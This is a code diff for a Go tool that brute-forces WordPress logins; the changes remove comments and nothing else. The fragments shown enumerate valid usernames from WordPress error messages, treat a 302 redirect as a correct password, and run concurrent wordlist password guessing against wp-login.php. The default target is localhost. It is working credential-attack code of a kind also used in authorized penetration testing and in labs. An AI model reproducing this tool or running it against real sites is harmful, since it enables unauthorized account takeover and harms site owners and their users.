@@ -20,12 +20,12 @@ import (
 const (
 	defaultTarget      = "http://localhost/wp-login.php"
 	defaultConcurrency = 10
-	defaultTimeout     = 10 // seconds
+	defaultTimeout     = 10
 
-	// WordPress error strings (English locale)
-	errBadUsername = "incorrect username"   // substring in the HTML response
-	errBadPassword = "incorrect password"   // substring in the HTML response
-	errUnknownUser = "unknown username"     // alternative phrasing
+	// WordPress error strings
+	errBadUsername = "incorrect username"
+	errBadPassword = "incorrect password"
+	errUnknownUser = "unknown username"
 )
 
 // ---------------------------------------------------------------
@@ -58,7 +58,6 @@ func initClient(timeoutSec int) {
 	}
 }
 
-// postLogin sends a POST to wp-login.php and returns (body, statusCode, error).
 func postLogin(target, username, password string) (string, int, error) {
 	data := url.Values{
 		"log":         {username},
@@ -96,8 +95,6 @@ func postLogin(target, username, password string) (string, int, error) {
 
 func bodyLower(body string) string { return strings.ToLower(body) }
 
-// isValidUsername returns true when WP does NOT say the username is wrong.
-// WP returns an error page (200) with specific strings for bad usernames.
 func isValidUsername(body string, status int) bool {
 	b := bodyLower(body)
 	if strings.Contains(b, errBadUsername) || strings.Contains(b, errUnknownUser) {
@@ -106,15 +103,9 @@ func isValidUsername(body string, status int) bool {
 	return true
 }
 
-// isValidPassword returns true when the login succeeded.
-// Success: WP issues a 302 redirect to /wp-admin/.
 func isValidPassword(body string, status int) bool {
 	return status == 302
 }
-
-// ---------------------------------------------------------------
-// Wordlist loader
-// ---------------------------------------------------------------
 
 func loadWords(path string) ([]string, error) {
 	f, err := os.Open(path)
@@ -184,8 +175,6 @@ func enumerateUsernames(target string, words []string, concurrency int) []string
 // Phase 2 – password bruteforce
 // ---------------------------------------------------------------
 
-// brutePassword tries all passwords for a single username.
-// Returns the password if found, "" otherwise.
 func brutePassword(target, username string, words []string, concurrency int) string {
 	fmt.Printf("\n[*] Phase 2: Password bruteforce for %q (%d words, %d workers)\n",
 		username, len(words), concurrency)
@@ -230,12 +219,10 @@ func brutePassword(target, username string, words []string, concurrency int) str
 		}()
 	}
 
-	// Feed jobs; stop early if a result is found
 	go func() {
 		for _, w := range words {
 			select {
 			case <-done:
-				// drain remaining words so workers exit cleanly
 				for range words {
 				}
 				goto drainDone
